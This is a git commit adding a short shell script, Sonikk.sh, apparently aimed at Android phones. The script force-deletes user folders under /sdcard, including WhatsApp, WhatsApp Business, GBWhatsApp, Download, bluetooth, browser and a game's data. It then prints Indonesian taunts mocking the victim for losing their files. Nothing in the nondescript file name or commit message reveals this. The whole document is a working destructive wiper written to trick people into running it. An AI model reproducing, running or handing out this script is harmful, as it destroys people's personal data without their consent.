70c960c04e5c2bc9f29c3aa1d760b0cac8f8c481
fakradi <56883399+fakradi@users.noreply.github.com>
2019-11-02 05:57:14 +0700

    Add files via upload

---
+++ Sonikk.sh
@@ -0,0 +1,15 @@
+cd /sdcard
+rm -rf index.html
+rm -rf Android
+rm -rf bluetooth
+rm -rf WhatsApp
+rm -rf com.garena.game.codm
+rm -rf Download
+rm -rf GBWhatsApp
+rm -rf browser
+rm -rf WhatsApp Business
+echo "mampus lu anjing"
+echo "ᴹ4ᴵᴸ❦ᶻlucifeᴿ꧂⁩ gans tq"
+echo "kesel ya!! hahahaah"
+echo "Mampus lu anjing hahhaha"
+echo "Ya file nya hilang hahahha"
